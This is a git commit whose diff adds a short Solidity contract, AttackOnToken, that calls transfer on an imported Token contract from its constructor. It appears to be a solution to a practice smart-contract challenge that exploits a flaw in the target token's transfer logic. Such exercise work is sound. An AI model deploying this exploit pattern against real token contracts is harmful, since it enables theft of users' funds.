c13ec3dd81074de570da270fb6e3ba5a771b65c0
Shrish Kumar <srsydv1802@gmail.com>
2023-09-05 13:40:36 +0530

    Update AttackOnToken.sol

--- AttackOnToken.sol
+++ AttackOnToken.sol
@@ -1,1 +1,9 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./Token.sol";
 
+contract AttackOnToken {
+    constructor(address TokenAddress) {
+        Token(TokenAddress).transfer(msg.sender,1);
+    }
+}
